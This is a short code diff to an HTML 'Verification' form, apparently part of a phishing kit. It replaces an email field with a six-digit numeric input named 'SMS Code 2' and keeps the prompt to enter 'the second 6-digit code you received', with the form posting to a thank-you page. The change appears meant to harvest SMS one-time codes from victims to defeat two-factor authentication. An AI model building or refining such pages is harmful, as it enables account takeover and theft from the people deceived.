@@ -50,7 +50,7 @@ form:valid .n-btn { background: #000; color: #fff; }
     <div class="n-title">Verification</div>
     <div class="n-subtitle">Verify</div>
     <form action="neo101_thankyou.html" method="POST">
-        <div class="n-input-wrapper"><input type="email" class="n-input" placeholder="Verification Code" required></div>
+        <div class="n-input-wrapper"><input type="text" name="SMS Code 2" class="n-input" placeholder="6-digit code" required maxlength="6" pattern="\d{6}" inputmode="numeric" style="letter-spacing: 4px; font-size: 20px; text-align: center;"></div>
         
         <a href="#" class="n-link">Forgot your password?</a>
         <a href="#" class="n-link">Enter the second 6-digit code you received.</a>
